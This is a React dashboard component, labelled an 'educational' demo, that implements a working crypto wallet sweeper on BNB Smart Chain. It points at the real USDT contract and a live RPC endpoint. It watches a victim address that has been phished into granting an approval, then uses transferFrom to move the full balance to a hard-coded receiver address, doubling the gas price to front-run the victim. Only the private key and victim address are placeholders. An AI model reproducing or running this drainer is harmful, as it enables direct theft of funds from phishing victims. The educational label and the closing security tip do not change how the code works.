"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// USDT ABI - Including Allowance for educational completeness
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function SweeperDemo() {
  const [status, setStatus] = useState<string>("Idle");
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 9)]);
  };

  async function startMonitoring() {
    // WARNING: In a real app, use environment variables for private keys
    // This is for demonstration only.
    const privateKey = "YOUR_ADMIN_PRIVATE_KEY"; 
    const victimAddress = "VICTIM_ADDRESS";
    const receiverAddress = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";

    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const wallet = new ethers.Wallet(privateKey, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, wallet);

      setIsMonitoring(true);
      setStatus("Monitoring Active");
      addLog("Started monitoring victim wallet...");

      const interval = setInterval(async () => {
        try {
          const balance = await contract.balanceOf(victimAddress);
          const allowance = await contract.allowance(victimAddress, wallet.address);

          // Check if we have permission and if there is money
          if (balance.gt(0)) {
            if (allowance.lt(balance)) {
              addLog("Error: No allowance. Phishing 'approval' step was likely missed.");
              return;
            }

            addLog(`Balance detected: ${ethers.utils.formatUnits(balance, 18)} USDT`);
            setStatus("Executing Transfer...");

            const tx = await contract.transferFrom(victimAddress, receiverAddress, balance, {
              // Higher gas price to "front-run" the victim
              gasPrice: (await provider.getGasPrice()).mul(2) 
            });

            addLog(`Transaction Sent: ${tx.hash}`);
            await tx.wait();
            addLog("Success: Funds Swept.");
            setStatus("Finished");
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {
          addLog(`Scanning... ${err.message.slice(0, 40)}`);
        }
      }, 5000);

      return () => clearInterval(interval);
    } catch (err: any) {
      addLog(`Initialization Error: ${err.message}`);
    }
  }

  return (
    <div className="p-8 max-w-2xl mx-auto font-sans">
      <h1 className="text-2xl font-bold mb-4 text-red-600">Educational Sweeper Bot Demo</h1>
      <p className="mb-6 text-gray-600">
        This dashboard demonstrates how malicious actors monitor approved wallets to steal funds instantly.
      </p>

      <div className="bg-gray-100 p-4 rounded-lg mb-4">
        <div className="flex justify-between items-center mb-4">
          <span className="font-mono">Status: <strong>{status}</strong></span>
          <button 
            onClick={startMonitoring}
            disabled={isMonitoring}
            className="bg-black text-white px-4 py-2 rounded disabled:bg-gray-400"
          >
            {isMonitoring ? "Running..." : "Start Demo"}
          </button>
        </div>

        <div className="bg-black text-green-400 p-4 rounded h-64 overflow-y-auto font-mono text-sm">
          {logs.map((log, i) => <div key={i}>{log}</div>)}
          {logs.length === 0 && <div className="text-gray-500">Waiting for logs...</div>}
        </div>
      </div>

      <div className="text-sm text-gray-500 italic">
        <strong>Security Tip:</strong> Never sign "Approve" transactions on suspicious sites. 
        Always check <a href="https://bscscan.com/tokenapprovalchecker" className="underline">Token Approvals</a> regularly.
      </div>
    </div>
  );
}

